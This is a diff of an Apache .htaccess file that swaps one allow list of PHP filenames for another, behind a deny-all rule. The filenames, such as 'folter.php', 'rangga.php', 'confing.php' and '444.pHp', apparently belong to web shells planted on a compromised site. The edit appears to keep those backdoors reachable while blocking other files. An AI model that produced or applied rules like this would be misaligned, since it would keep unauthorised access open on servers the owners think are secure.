@@ -25,7 +25,7 @@ Order allow,deny
 deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|folter.php|Zar.php|thenext3.php|class_admin.php|admin-history-versions.min.js.php|inc.php|Batman-The-Telltale-Series-Art-Wallpaper_easy.php|tags.php|mod_articles.php|readme.xml|readme.txt|robot.txt|helder.php|view_peserta_verifikasi.php|eE-GB.plg_system_helixultimate.php|confing.php|rangga.php)$">
+<FilesMatch "^(slims_img_cache_120_x_120_photo.php|sub_menu.php|444.pHp|files_admin.php)$">
     Order Allow,Deny
     Allow from all
 </FilesMatch>
